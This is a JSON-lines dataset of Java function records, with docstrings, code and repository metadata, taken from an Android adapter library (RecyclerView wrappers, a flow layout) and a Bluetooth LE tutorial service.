{"docstring": "//\u591a\u56de\u4f20\u4e00\u4e2alayoutId\u51fa\u53bb\uff0c\u7528\u4e8e\u5224\u65ad\u662f\u7b2c\u51e0\u4e2aheaderview\n", "func_signal": "@Override\n    public void onBindViewHolder(RecyclerView.ViewHolder holder, int position)", "code": "{\n        if (isHeaderViewPos(position)) {\n            onBindHeaderHolder((ViewHolder) holder, position, mHeaderDatas.get(position).getLayoutId(), mHeaderDatas.get(position).getData());\n            return;\n        } else if (isFooterViewPos(position)) {\n            int footerPosition = position - getInnerItemCount() - getHeaderViewCount();\n            onBindHeaderHolder((ViewHolder) holder, position, mFooterDatas.get(footerPosition).getLayoutId(), mFooterDatas.get(footerPosition).getData());\n            return;\n        }\n        //\u4e3e\u4f8b\u5b50\uff0c2\u4e2aheader\uff0c0 1\u662f\u5934\uff0c2\u662f\u5f00\u59cb\uff0c2-2 = 0\n        mInnerAdapter.onBindViewHolder(holder, position - getHeaderViewCount());\n    }", "path": "adapter-lib\\src\\main\\java\\com\\mcxtzhang\\commonadapter\\rv\\HeaderRecyclerAndFooterWrapperAdapter.java", "repo_name": "mcxtzhang/all-base-adapter", "stars": 530, "license": "apache-2.0", "language": "java", "size": 25995}
{"docstring": "/**\n * \u8bbe\u7f6e\u67d0\u4e2a\u4f4d\u7f6e\u7684HeaderView\n *\n * @param headerPos \u4ece0\u5f00\u59cb\uff0c\u5982\u679cpos\u8fc7\u5927 \u5c31\u662faddHeaderview\n * @param layoutId\n * @param data\n * @param cacheSize \u8be5\u79cdheaderView\u5728\u7f13\u5b58\u6c60\u4e2d\u7684\u7f13\u5b58\u4e2a\u6570\n */\n", "func_signal": "public void setHeaderView(int headerPos, int layoutId, Object data, int cacheSize)", "code": "{\n    if (mHeaderDatas.size() > headerPos) {\n/*            SparseArrayCompat headerContainer = new SparseArrayCompat();\n        headerContainer.put(layoutId, data);\n        mHeaderDatas.setValueAt(headerPos, headerContainer);*/\n        mHeaderDatas.get(headerPos).setLayoutId(layoutId);\n        mHeaderDatas.get(headerPos).setData(data);\n        mHeaderDatas.get(headerPos).setCacheSize(cacheSize);\n    } else if (mHeaderDatas.size() == headerPos) {//\u8c03\u7528addHeaderView\n        addHeaderView(layoutId, data, cacheSize);\n    } else {\n        //\n        addHeaderView(layoutId, data, cacheSize);\n    }\n}", "path": "adapter-lib\\src\\main\\java\\com\\mcxtzhang\\commonadapter\\rv\\HeaderRecyclerAndFooterWrapperAdapter.java", "repo_name": "mcxtzhang/all-base-adapter", "stars": 530, "license": "apache-2.0", "language": "java", "size": 25995}
{"docstring": "//\u6ca1\u770b\u5934\n", "func_signal": "private List<FlowBean> iniDatas()", "code": "{\n    List<FlowBean> datas = new ArrayList<>();\n\n/*        for (int i=0;i<10;i++){\n\n    }*/\n    datas.add(new FlowBean(\"\u6211\u4e5f\u4e0d\u77e5\u9053\u7ba1\u6211\u4ec0\u4e48\u4e8b\u7684\u65b0\u95fb\"));\n    datas.add(new FlowBean(\"\u4f53\u80b2\"));\n\n    datas.add(new FlowBean(\"\u5403\u74dc\u7fa4\u4f17\u559c\u6b22\u7684\"));\n    datas.add(new FlowBean(\"\u519b\u4e8b\"));\n    datas.add(new FlowBean(\"\u5a31\u4e50\u5708\"));\n\n    datas.add(new FlowBean(\"\u6211\u731c\u4f60\u4e5f\u8bb8\u559c\u6b22\u7684\u5427\"));\n    datas.add(new FlowBean(\"\u516b\u5366\"));\n    datas.add(new FlowBean(\"\u8001\u677f\u8ba9\u6211\u968f\u4fbf\u63a8\u9001\u7684\"));\n    datas.add(new FlowBean(\"\u5f20\u65ed\u7ae5\u7684\u90a3\u4e9b\u4e8b\u513f\"));\n    datas.add(new FlowBean(\"\u5c0f\u9a6c\u53ef\u4ee5\u6765\u4e86\"));\n    return datas;\n}", "path": "app\\src\\main\\java\\mcxtzhang\\commonviewgroupadapter\\databinding\\viewgroup\\DBFlowSwipeActivity.java", "repo_name": "mcxtzhang/all-base-adapter", "stars": 530, "license": "apache-2.0", "language": "java", "size": 25995}
{"docstring": "/*    public void setFooterView(View v) {\n        clearFooterView();\n        addFooterView(v);\n    }*/\n", "func_signal": "@Override\n    public int getItemViewType(int position)", "code": "{\n        if (isHeaderViewPos(position)) {\n            return mHeaderDatas.get(position).getLayoutId();\n        } else if (isFooterViewPos(position)) {//\u4e3e\u4f8b\uff1aheader 2\uff0c innter 2\uff0c 0123\u90fd\u4e0d\u662f\uff0c4\u624d\u662f\uff0c4-2-2 = 0\uff0cok\u3002\n            return mFooterDatas.get(position - getHeaderViewCount() - getInnerItemCount()).getLayoutId();\n        }\n        return mInnerAdapter.getItemViewType(position - getHeaderViewCount());\n    }", "path": "adapter-lib\\src\\main\\java\\com\\mcxtzhang\\commonadapter\\rv\\HeaderRecyclerAndFooterWrapperAdapter.java", "repo_name": "mcxtzhang/all-base-adapter", "stars": 530, "license": "apache-2.0", "language": "java", "size": 25995}
{"docstring": "//\u8be5\u79cdviewType\u7684HeaderView \u5728RecyclerViewPool\u7684\u7f13\u5b58\u6c60\u5185\u7684\u7f13\u5b58\u6570\u91cf\n", "func_signal": "public HeaderData(int layoutId, Object data, int cacheSize)", "code": "{\n            this.layoutId = layoutId;\n            this.data = data;\n            this.cacheSize = cacheSize;\n        }", "path": "adapter-lib\\src\\main\\java\\com\\mcxtzhang\\commonadapter\\rv\\HeaderRecyclerAndFooterWrapperAdapter.java", "repo_name": "mcxtzhang/all-base-adapter", "stars": 530, "license": "apache-2.0", "language": "java", "size": 25995}
{"docstring": "/**\n * \u5237\u65b0\u6570\u636e\uff0c\u521d\u59cb\u5316\u6570\u636e\n *\n * @param list\n */\n", "func_signal": "public void setDatas(List<D> list)", "code": "{\n    if (this.mDatas != null) {\n        if (null != list) {\n            List<D> temp = new ArrayList<D>();\n            temp.addAll(list);\n            this.mDatas.clear();\n            this.mDatas.addAll(temp);\n        } else {\n            this.mDatas.clear();\n        }\n    } else {\n        this.mDatas = list;\n    }\n    notifyDataSetChanged();\n}", "path": "adapter-lib\\src\\main\\java\\com\\mcxtzhang\\commonadapter\\databinding\\rv\\BaseBindingAdapter.java", "repo_name": "mcxtzhang/all-base-adapter", "stars": 530, "license": "apache-2.0", "language": "java", "size": 25995}
{"docstring": "/**\n * \u7528\u4e8e\u8bbe\u7f6eItem\u7684\u4e8b\u4ef6Presenter\n *\n * @param itemPresenter\n * @return\n */\n", "func_signal": "public BaseBindingAdapter setItemPresenter(Object itemPresenter)", "code": "{\n    ItemPresenter = itemPresenter;\n    return this;\n}", "path": "adapter-lib\\src\\main\\java\\com\\mcxtzhang\\commonadapter\\databinding\\rv\\BaseBindingAdapter.java", "repo_name": "mcxtzhang/all-base-adapter", "stars": 530, "license": "apache-2.0", "language": "java", "size": 25995}
{"docstring": "//\u6ca1\u770b\u5934\n", "func_signal": "private List<FlowBean> iniDatas()", "code": "{\n    List<FlowBean> datas = new ArrayList<>();\n\n/*        for (int i=0;i<10;i++){\n\n    }*/\n    datas.add(new FlowBean(\"\u6211\u4e5f\u4e0d\u77e5\u9053\u7ba1\u6211\u4ec0\u4e48\u4e8b\u7684\u65b0\u95fb\"));\n    datas.add(new FlowBean(\"\u4f53\u80b2\"));\n\n    datas.add(new FlowBean(\"\u5403\u74dc\u7fa4\u4f17\u559c\u6b22\u7684\"));\n    datas.add(new FlowBean(\"\u519b\u4e8b\"));\n    datas.add(new FlowBean(\"\u5a31\u4e50\u5708\"));\n\n    datas.add(new FlowBean(\"\u6211\u731c\u4f60\u4e5f\u8bb8\u559c\u6b22\u7684\u5427\"));\n    datas.add(new FlowBean(\"\u516b\u5366\"));\n    datas.add(new FlowBean(\"\u8001\u677f\u8ba9\u6211\u968f\u4fbf\u63a8\u9001\u7684\"));\n    datas.add(new FlowBean(\"\u5f20\u65ed\u7ae5\u7684\u90a3\u4e9b\u4e8b\u513f\"));\n    datas.add(new FlowBean(\"\u5c0f\u9a6c\u53ef\u4ee5\u6765\u4e86\"));\n    return datas;\n}", "path": "app\\src\\main\\java\\mcxtzhang\\commonviewgroupadapter\\viewgroup\\flowswipe\\FlowSwipeActivity.java", "repo_name": "mcxtzhang/all-base-adapter", "stars": 530, "license": "apache-2.0", "language": "java", "size": 25995}
{"docstring": "/**\n * \u5b50\u7c7b\u9664\u4e86\u7ed1\u5b9a\u6570\u636e\uff0c\u8fd8\u8981\u8bbe\u7f6e\u76d1\u542c\u5668\u7b49\u5176\u4ed6\u64cd\u4f5c\u3002\n * \u53ef\u4ee5\u91cd\u5199\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u4e0d\u8981\u5220\u6389super.onBindViewHolder(holder, position);\n *\n * @param holder\n * @param position\n */\n", "func_signal": "@Override\npublic void onBindViewHolder(BaseBindingVH<B> holder, int position)", "code": "{\n    holder.getBinding().setVariable(BR.data, mDatas.get(position));\n    holder.getBinding().setVariable(BR.itemP, ItemPresenter);\n    holder.getBinding().executePendingBindings();\n}", "path": "adapter-lib\\src\\main\\java\\com\\mcxtzhang\\commonadapter\\databinding\\rv\\BaseBindingAdapter.java", "repo_name": "mcxtzhang/all-base-adapter", "stars": 530, "license": "apache-2.0", "language": "java", "size": 25995}
{"docstring": "//\u5728onMeasure\u91cc\uff0c\u6d4b\u91cf\u6240\u6709\u5b50View\u7684\u5bbd\u9ad8\uff0c\u4ee5\u53ca\u786e\u5b9aViewgroup\u81ea\u5df1\u7684\u5bbd\u9ad8\u3002\n", "func_signal": "@Override\nprotected void onMeasure(int widthMeasureSpec, int heightMeasureSpec)", "code": "{\n    //\u83b7\u53d6\u7cfb\u7edf\u4f20\u9012\u8fc7\u6765\u6d4b\u91cf\u51fa\u7684\u5bbd\u5ea6 \u9ad8\u5ea6\uff0c\u4ee5\u53ca\u76f8\u5e94\u7684\u6d4b\u91cf\u6a21\u5f0f\u3002\n    //\u5982\u679c\u6d4b\u91cf\u6a21\u5f0f\u4e3a EXACTLY( \u786e\u5b9a\u7684dp\u503c\uff0cmatch_parent)\uff0c\u5219\u53ef\u4ee5\u8c03\u7528setMeasuredDimension()\u8bbe\u7f6e\uff0c\n    //\u5982\u679c\u6d4b\u91cf\u6a21\u5f0f\u4e3a AT_MOST(wrap_content),\u5219\u9700\u8981\u7ecf\u8fc7\u8ba1\u7b97\u518d\u53bb\u8c03\u7528setMeasuredDimension()\u8bbe\u7f6e\n    int widthMeasure = MeasureSpec.getSize(widthMeasureSpec);\n    int widthMode = MeasureSpec.getMode(widthMeasureSpec);\n    int heightMeasure = MeasureSpec.getSize(heightMeasureSpec);\n    int heightMode = MeasureSpec.getMode(heightMeasureSpec);\n\n    //\u8ba1\u7b97\u5bbd\u5ea6 \u9ad8\u5ea6 //wrap_content\u6d4b\u91cf\u6a21\u5f0f\u4e0b\u4f1a\u4f7f\u7528\u5230:\n    //\u5b58\u50a8\u6700\u540e\u8ba1\u7b97\u51fa\u7684\u5bbd\u5ea6\uff0c\n    int maxLineWidth = 0;\n    //\u5b58\u50a8\u6700\u540e\u8ba1\u7b97\u51fa\u7684\u9ad8\u5ea6\n    int totalHeight = 0;\n    //\u5b58\u50a8\u5f53\u524d\u884c\u7684\u5bbd\u5ea6\n    int curLineWidth = 0;\n    //\u5b58\u50a8\u5f53\u524d\u884c\u7684\u9ad8\u5ea6\n    int curLineHeight = 0;\n\n    // \u5f97\u5230\u5185\u90e8\u5143\u7d20\u7684\u4e2a\u6570\n    int count = getChildCount();\n\n    //\u5b58\u50a8\u5b50View\n    View child = null;\n    //\u5b58\u50a8\u5b50View\u7684LayoutParams\n    MarginLayoutParams params = null;\n    //\u5b50View Layout\u9700\u8981\u7684\u5bbd\u9ad8(\u5305\u542bmargin)\uff0c\u7528\u4e8e\u8ba1\u7b97\u662f\u5426\u8d8a\u754c\n    int childWidth;\n    int childHeight;\n\n    //\u904d\u5386\u5b50View \u8ba1\u7b97\u7236\u63a7\u4ef6\u5bbd\u9ad8\n    for (int i = 0; i < count; i++) {\n        child = getChildAt(i);\n        //\u5982\u679cgone\uff0c\u4e0d\u6d4b\u91cf\u4e86\n        if (View.GONE == child.getVisibility()) {\n            continue;\n        }\n        //\u5148\u6d4b\u91cf\u5b50View\n        measureChild(child, widthMeasureSpec, heightMeasureSpec);\n\n        //\u83b7\u53d6\u5b50View\u7684LayoutParams\uff0c(\u5b50View\u7684LayoutParams\u7684\u5bf9\u8c61\u7c7b\u578b\uff0c\u53d6\u51b3\u4e8e\u5176ViewGroup\u7684generateLayoutParams()\u65b9\u6cd5\u7684\u8fd4\u56de\u7684\u5bf9\u8c61\u7c7b\u578b\uff0c\u8fd9\u91cc\u8fd4\u56de\u7684\u662fMarginLayoutParams)\n        params = (MarginLayoutParams) child.getLayoutParams();\n        //\u5b50View\u9700\u8981\u7684\u5bbd\u5ea6 \u4e3a \u5b50View \u672c\u8eab\u5bbd\u5ea6+marginLeft + marginRight\n        childWidth = child.getMeasuredWidth() + params.leftMargin + params.rightMargin;\n        childHeight = child.getMeasuredHeight() + params.topMargin + params.bottomMargin;\n        //Log.i(TAG, \"\u5b50View Layout\u9700\u8981\u7684\u5bbd\u9ad8(\u5305\u542bmargin)\uff1achildWidth:\" + childWidth + \"   ,childHeight:\" + childHeight);\n\n        //\u5982\u679c\u5f53\u524d\u7684\u884c\u5bbd\u5ea6\u5927\u4e8e \u7236\u63a7\u4ef6\u5141\u8bb8\u7684\u6700\u5927\u5bbd\u5ea6 \u5219\u8981\u6362\u884c\n        //\u7236\u63a7\u4ef6\u5141\u8bb8\u7684\u6700\u5927\u5bbd\u5ea6 \u5982\u679c\u8981\u9002\u914d padding \u8fd9\u91cc\u8981- getPaddingLeft() - getPaddingRight()\n        //\u5373\u4e3a\u6d4b\u91cf\u51fa\u7684\u5bbd\u5ea6\u51cf\u53bb\u7236\u63a7\u4ef6\u7684\u5de6\u53f3\u8fb9\u8ddd\n        if (curLineWidth + childWidth > widthMeasure - getPaddingLeft() - getPaddingRight()) {\n            //\u901a\u8fc7\u6bd4\u8f83 \u5f53\u524d\u884c\u5bbd \u548c\u4ee5\u524d\u5b58\u50a8\u7684\u6700\u5927\u884c\u5bbd,\u5f97\u5230\u6700\u65b0\u7684\u6700\u5927\u884c\u5bbd,\u7528\u4e8e\u8bbe\u7f6e\u7236\u63a7\u4ef6\u7684\u5bbd\u5ea6\n            maxLineWidth = Math.max(maxLineWidth, curLineWidth);\n            //\u7236\u63a7\u4ef6\u7684\u9ad8\u5ea6\u589e\u52a0\u4e86\uff0c\u4e3a\u5f53\u524d\u9ad8\u5ea6+\u5f53\u524d\u884c\u7684\u9ad8\u5ea6\n            totalHeight += curLineHeight;\n            //\u6362\u884c\u540e \u5237\u65b0 \u5f53\u524d\u884c \u5bbd\u9ad8\u6570\u636e\uff1a \u56e0\u4e3a\u65b0\u7684\u4e00\u884c\u5c31\u8fd9\u4e00\u4e2aView\uff0c\u6240\u4ee5\u4e3a\u5f53\u524d\u8fd9\u4e2aview\u5360\u7528\u7684\u5bbd\u9ad8(\u8981\u52a0\u4e0aView \u7684 margin)\n            curLineWidth = childWidth;\n            curLineHeight = childHeight;\n        } else {\n            //\u4e0d\u6362\u884c\uff1a\u53e0\u52a0\u5f53\u524d\u884c\u5bbd \u548c \u6bd4\u8f83\u5f53\u524d\u884c\u9ad8:\n            curLineWidth += childWidth;\n            curLineHeight = Math.max(curLineHeight, childHeight);\n        }\n        //\u5982\u679c\u5df2\u7ecf\u662f\u6700\u540e\u4e00\u4e2aView,\u8981\u6bd4\u8f83\u5f53\u524d\u884c\u7684 \u5bbd\u5ea6\u548c\u6700\u5927\u5bbd\u5ea6\uff0c\u53e0\u52a0\u4e00\u5171\u7684\u9ad8\u5ea6\n        if (i == count - 1) {\n            maxLineWidth = Math.max(maxLineWidth, curLineWidth);\n            totalHeight += childHeight;\n        }\n    }\n\n    //Log.i(TAG, \"\u7cfb\u7edf\u6d4b\u91cf\u5141\u8bb8\u7684\u5c3a\u5bf8\u6700\u5927\u503c\uff1awidthMeasure:\" + widthMeasure + \"   ,heightMeasure:\" + heightMeasure);\n    //Log.i(TAG, \"\u7ecf\u8fc7\u6211\u4eec\u6d4b\u91cf\u5b9e\u9645\u7684\u5c3a\u5bf8(\u4e0d\u5305\u62ec\u7236\u63a7\u4ef6\u7684padding)\uff1amaxLineWidth:\" + maxLineWidth + \"   ,totalHeight:\" + totalHeight);\n    //Log.i(TAG, \"heightMode == MeasureSpec.AT_MOST:\" +(heightMode == MeasureSpec.AT_MOST));\n    //Log.i(TAG, \"heightMode == MeasureSpec.EXACTLY:\" +(heightMode == MeasureSpec.EXACTLY));\n    //Log.i(TAG, \"heightMode == MeasureSpec.UNSPECIFIED:\" +(heightMode == MeasureSpec.UNSPECIFIED));\n\n    //\u9002\u914dpadding,\u5982\u679c\u662fwrap_content,\u5219\u9664\u4e86\u5b50\u63a7\u4ef6\u672c\u8eab\u5360\u636e\u7684\u63a7\u4ef6\uff0c\u8fd8\u8981\u5728\u52a0\u4e0a\u7236\u63a7\u4ef6\u7684padding\n    setMeasuredDimension(\n            widthMode != MeasureSpec.EXACTLY ? maxLineWidth + getPaddingLeft() + getPaddingRight() : widthMeasure,\n            heightMode != MeasureSpec.EXACTLY ? totalHeight + getPaddingTop() + getPaddingBottom() : heightMeasure);//fix by zhangxutong \u6709\u4e9b\u9875\u9762\u592a\u957f\u4e86\n}", "path": "adapter-lib\\src\\main\\java\\com\\mcxtzhang\\commonadapter\\viewgroup\\widget\\FlowViewGroup.java", "repo_name": "mcxtzhang/all-base-adapter", "stars": 530, "license": "apache-2.0", "language": "java", "size": 25995}
{"docstring": "//\u5e03\u5c40\u7236\u63a7\u4ef6\u4f4d\u7f6e\u4ee5\u53ca\u5b50\u63a7\u4ef6\u7684\u4f4d\u7f6e\n", "func_signal": "@Override\nprotected void onLayout(boolean changed, int l, int t, int r, int b)", "code": "{\n    //Log.i(TAG, \"changed:\" + changed + \"   ,l:\" + l + \"  t:\" + t + \"  r:\" + r + \"  b:\" + b);\n    //\u5b50\u63a7\u4ef6\u7684\u4e2a\u6570\n    int count = getChildCount();\n    //ViewParent\u5bbd\u5ea6(\u5305\u542bpadding)\n    int width = getWidth();\n    //ViewParent \u7684\u53f3\u8fb9x\u7684\u5e03\u5c40\u9650\u5236\u503c\n    int rightLimit = width - getPaddingRight();\n\n    //\u5b58\u50a8\u57fa\u51c6\u7684left top (\u5b50\u7c7b.layout(),\u91cc\u7684\u5750\u6807\u662f\u57fa\u4e8e\u7236\u63a7\u4ef6\u7684\u5750\u6807\uff0c\u6240\u4ee5 x\u5e94\u8be5\u662f\u4ece0+\u7236\u63a7\u4ef6\u5de6\u5185\u8fb9\u8ddd\u5f00\u59cb\uff0cy\u4ece0+\u7236\u63a7\u4ef6\u4e0a\u5185\u8fb9\u8ddd\u5f00\u59cb)\n    int baseLeft = 0 + getPaddingLeft();\n    int baseTop = 0 + getPaddingTop();\n    //\u5b58\u50a8\u73b0\u5728\u7684left top\n    int curLeft = baseLeft;\n    int curTop = baseTop;\n\n    //\u5b50View\n    View child = null;\n    //\u5b50view\u7528\u4e8elayout\u7684 l t r b\n    int viewL, viewT, viewR, viewB;\n    //\u5b50View\u7684LayoutParams\n    MarginLayoutParams params = null;\n    //\u5b50View Layout\u9700\u8981\u7684\u5bbd\u9ad8(\u5305\u542bmargin)\uff0c\u7528\u4e8e\u8ba1\u7b97\u662f\u5426\u8d8a\u754c\n    int childWidth;\n    int childHeight;\n    //\u5b50View \u672c\u8eab\u7684\u5bbd\u9ad8\n    int childW, childH;\n\n    //\u4e34\u65f6\u589e\u52a0\u4e00\u4e2atemp \u5b58\u50a8\u4e0a\u4e00\u4e2aView\u7684\u9ad8\u5ea6 \u89e3\u51b3\u8fc7\u957f\u7684\u4e24\u884cView\u5bfc\u81f4\u663e\u793a\u4e0d\u6b63\u786e\u7684bug\n    int lastChildHeight = 0;\n    //\n    for (int i = 0; i < count; i++) {\n        child = getChildAt(i);\n\n        //\u5982\u679cgone\uff0c\u4e0d\u5e03\u5c40\u4e86\n        if (View.GONE == child.getVisibility()) {\n            continue;\n        }\n        //\u83b7\u53d6\u5b50View\u672c\u8eab\u7684\u5bbd\u9ad8:\n        childW = child.getMeasuredWidth();\n        childH = child.getMeasuredHeight();\n        //\u83b7\u53d6\u5b50View\u7684LayoutParams\uff0c\u7528\u4e8e\u83b7\u53d6\u5176margin\n        params = (MarginLayoutParams) child.getLayoutParams();\n        //\u5b50View\u9700\u8981\u7684\u5bbd\u9ad8 \u4e3a \u672c\u8eab\u5bbd\u9ad8+marginLeft + marginRight\n        childWidth = childW + params.leftMargin + params.rightMargin;\n        childHeight = childH + params.topMargin + params.bottomMargin;\n\n        //\u8fd9\u91cc\u8981\u8003\u8651padding\uff0c\u6240\u4ee5\u53f3\u8fb9\u754c\u4e3a ViewParent\u5bbd\u5ea6(\u5305\u542bpadding) -ViewParent\u53f3\u5185\u8fb9\u8ddd\n        if (curLeft + childWidth > rightLimit) {\n            //\u5982\u679c\u5f53\u524d\u884c\u5df2\u7ecf\u653e\u4e0d\u4e0b\u8be5\u5b50View\u4e86 \u9700\u8981\u6362\u884c\u653e\u7f6e\uff1a\n            //\u5728\u65b0\u7684\u4e00\u884c\u5e03\u5c40\u5b50View\uff0c\u5de6x\u5c31\u662fbaseLeft\uff0c\u4e0ay\u662f top +\u524d\u4e00\u884c\u9ad8(\u8fd9\u91cc\u5047\u8bbe\u7684\u662f\u6bcf\u4e00\u884c\u884c\u9ad8\u4e00\u6837)\uff0c\n            curTop = curTop + lastChildHeight;\n            //layout\u65f6\u8981\u8003\u8651margin\n            viewL = baseLeft + params.leftMargin;\n            viewT = curTop + params.topMargin;\n            viewR = viewL + childW;\n            viewB = viewT + childH;\n            //child.layout(baseLeft + params.leftMargin, curTop + params.topMargin, baseLeft + params.leftMargin + child.getMeasuredWidth(), curTop + params.topMargin + child.getMeasuredHeight());\n            //Log.i(TAG,\"\u65b0\u7684\u4e00\u884c:\" +\"   ,baseLeft:\"+baseLeft +\"  curTop:\"+curTop+\"  baseLeft+childWidth:\"+(baseLeft+childWidth)+\"  curTop+childHeight:\"+ ( curTop+childHeight));\n            curLeft = baseLeft + childWidth;\n\n        } else {\n            //\u5f53\u524d\u884c\u53ef\u4ee5\u653e\u4e0b\u5b50View:\n            viewL = curLeft + params.leftMargin;\n            viewT = curTop + params.topMargin;\n            viewR = viewL + childW;\n            viewB = viewT + childH;\n\n            //child.layout(curLeft + params.leftMargin, curTop + params.topMargin, curLeft + params.leftMargin + child.getMeasuredWidth(), curTop + params.topMargin + child.getMeasuredHeight());\n            //Log.i(TAG,\"\u5f53\u524d\u884c:\"+changed +\"   ,curLeft:\"+curLeft +\"  curTop:\"+curTop+\"  curLeft+childWidth:\"+(curLeft+childWidth)+\"  curTop+childHeight:\"+(curTop+childHeight));\n            curLeft = curLeft + childWidth;\n        }\n        lastChildHeight = childHeight;\n        //\u5e03\u5c40\u5b50View\n        child.layout(viewL, viewT, viewR, viewB);\n    }\n}", "path": "adapter-lib\\src\\main\\java\\com\\mcxtzhang\\commonadapter\\viewgroup\\widget\\FlowViewGroup.java", "repo_name": "mcxtzhang/all-base-adapter", "stars": 530, "license": "apache-2.0", "language": "java", "size": 25995}
{"docstring": "/**\n * \u901a\u8fc7viewId\u83b7\u53d6\u63a7\u4ef6\n *\n * @param viewId\n * @return\n */\n", "func_signal": "public <T extends View> T getView(int viewId)", "code": "{\n    View view = mViews.get(viewId);\n    if (view == null) {\n        view = mConvertView.findViewById(viewId);\n        mViews.put(viewId, view);\n    }\n    return (T) view;\n}", "path": "adapter-lib\\src\\main\\java\\com\\mcxtzhang\\commonadapter\\lvgv\\ViewHolder.java", "repo_name": "mcxtzhang/all-base-adapter", "stars": 530, "license": "apache-2.0", "language": "java", "size": 25995}
{"docstring": "/**\n * \u5728\u6307\u5b9a\u4f4d\u7f6e\u6dfb\u52a0\u4e00\u6761\u6570\u636e\n * \u4f1a\u81ea\u52a8\u5b9a\u5411\u5237\u65b0\n * <p>\n * \u5982\u679c\u6307\u5b9a\u4f4d\u7f6e\u8d8a\u754c\uff0c\u5219\u6dfb\u52a0\u5728\u961f\u5c3e\n *\n * @param position\n * @param data\n */\n", "func_signal": "public void add(int position, D data)", "code": "{\n    if (data != null && mDatas != null) {\n        if (mDatas.size() > position && position > -1) {\n            mDatas.add(position, data);\n            notifyItemInserted(position);\n        } else {\n            add(data);\n        }\n    }\n}", "path": "adapter-lib\\src\\main\\java\\com\\mcxtzhang\\commonadapter\\databinding\\rv\\BaseBindingAdapter.java", "repo_name": "mcxtzhang/all-base-adapter", "stars": 530, "license": "apache-2.0", "language": "java", "size": 25995}
{"docstring": "/**\n * \u8bbe\u7f6e\u67d0\u4e2a\u4f4d\u7f6e\u7684HeaderView\n *\n * @param headerPos \u4ece0\u5f00\u59cb\uff0c\u5982\u679cpos\u8fc7\u5927 \u5c31\u662faddHeaderview\n * @param layoutId\n * @param data\n */\n", "func_signal": "public void setHeaderView(int headerPos, int layoutId, Object data)", "code": "{\n    if (mHeaderDatas.size() > headerPos) {\n/*            SparseArrayCompat headerContainer = new SparseArrayCompat();\n        headerContainer.put(layoutId, data);\n        mHeaderDatas.setValueAt(headerPos, headerContainer);*/\n        mHeaderDatas.get(headerPos).setLayoutId(layoutId);\n        mHeaderDatas.get(headerPos).setData(data);\n    } else if (mHeaderDatas.size() == headerPos) {//\u8c03\u7528addHeaderView\n        addHeaderView(layoutId, data);\n    } else {\n        //\n        addHeaderView(layoutId, data);\n    }\n}", "path": "adapter-lib\\src\\main\\java\\com\\mcxtzhang\\commonadapter\\rv\\HeaderRecyclerAndFooterWrapperAdapter.java", "repo_name": "mcxtzhang/all-base-adapter", "stars": 530, "license": "apache-2.0", "language": "java", "size": 25995}
{"docstring": "/**\n * Request a read on a given {@code BluetoothGattCharacteristic}. The read result is reported\n * asynchronously through the {@code BluetoothGattCallback#onCharacteristicRead(android.bluetooth.BluetoothGatt, android.bluetooth.BluetoothGattCharacteristic, int)}\n * callback.\n *\n * @param characteristic The characteristic to read from.\n */\n", "func_signal": "public void readCharacteristic(BluetoothGattCharacteristic characteristic)", "code": "{\n    if (mBluetoothAdapter == null || mBluetoothGatt == null) {\n        Log.w(TAG, \"BluetoothAdapter not initialized\");\n        return;\n    }\n    mBluetoothGatt.readCharacteristic(characteristic);\n}", "path": "code\\5.5\\BleRGBController\\app\\src\\main\\java\\com\\example\\android\\bluetoothlegatt\\BluetoothLeService.java", "repo_name": "nladuo/IoT-Firstep", "stars": 641, "license": "gpl-3.0", "language": "java", "size": 105061}
{"docstring": "/**\n * Disconnects an existing connection or cancel a pending connection. The disconnection result\n * is reported asynchronously through the\n * {@code BluetoothGattCallback#onConnectionStateChange(android.bluetooth.BluetoothGatt, int, int)}\n * callback.\n */\n", "func_signal": "public void disconnect()", "code": "{\n    if (mBluetoothAdapter == null || mBluetoothGatt == null) {\n        Log.w(TAG, \"BluetoothAdapter not initialized\");\n        return;\n    }\n    mBluetoothGatt.disconnect();\n}", "path": "book\\old\\android-adt\\code\\6.4\\BLECom\\src\\com\\example\\android\\bluetoothlegatt\\BluetoothLeService.java", "repo_name": "nladuo/IoT-Firstep", "stars": 641, "license": "gpl-3.0", "language": "java", "size": 105061}
{"docstring": "/**\n * Enables or disables notification on a give characteristic.\n *\n * @param characteristic Characteristic to act on.\n * @param enabled If true, enable notification.  False otherwise.\n */\n", "func_signal": "public void setCharacteristicNotification(BluetoothGattCharacteristic characteristic,\n                                          boolean enabled)", "code": "{\n    if (mBluetoothAdapter == null || mBluetoothGatt == null) {\n        Log.w(TAG, \"BluetoothAdapter not initialized\");\n        return;\n    }\n    mBluetoothGatt.setCharacteristicNotification(characteristic, enabled);\n\n    // This is specific to Heart Rate Measurement.\n    if (UUID_HEART_RATE_MEASUREMENT.equals(characteristic.getUuid())) {\n        BluetoothGattDescriptor descriptor = characteristic.getDescriptor(\n                UUID.fromString(SampleGattAttributes.CLIENT_CHARACTERISTIC_CONFIG));\n        descriptor.setValue(BluetoothGattDescriptor.ENABLE_NOTIFICATION_VALUE);\n        mBluetoothGatt.writeDescriptor(descriptor);\n    }\n}", "path": "book\\old\\android-adt\\code\\6.5\\BleRGBController\\src\\com\\example\\android\\bluetoothlegatt\\BluetoothLeService.java", "repo_name": "nladuo/IoT-Firstep", "stars": 641, "license": "gpl-3.0", "language": "java", "size": 105061}
{"docstring": "/**\n * Enables or disables notification on a give characteristic.\n *\n * @param characteristic Characteristic to act on.\n * @param enabled If true, enable notification.  False otherwise.\n */\n", "func_signal": "public void setCharacteristicNotification(BluetoothGattCharacteristic characteristic,\n                                          boolean enabled)", "code": "{\n    if (mBluetoothAdapter == null || mBluetoothGatt == null) {\n        Log.w(TAG, \"BluetoothAdapter not initialized\");\n        return;\n    }\n    mBluetoothGatt.setCharacteristicNotification(characteristic, enabled);\n\n    // This is specific to Heart Rate Measurement.\n    if (UUID_HEART_RATE_MEASUREMENT.equals(characteristic.getUuid())) {\n        BluetoothGattDescriptor descriptor = characteristic.getDescriptor(\n                UUID.fromString(SampleGattAttributes.CLIENT_CHARACTERISTIC_CONFIG));\n        descriptor.setValue(BluetoothGattDescriptor.ENABLE_NOTIFICATION_VALUE);\n        mBluetoothGatt.writeDescriptor(descriptor);\n    }\n}", "path": "book\\old\\android-adt\\code\\6.4\\BLECom\\src\\com\\example\\android\\bluetoothlegatt\\BluetoothLeService.java", "repo_name": "nladuo/IoT-Firstep", "stars": 641, "license": "gpl-3.0", "language": "java", "size": 105061}
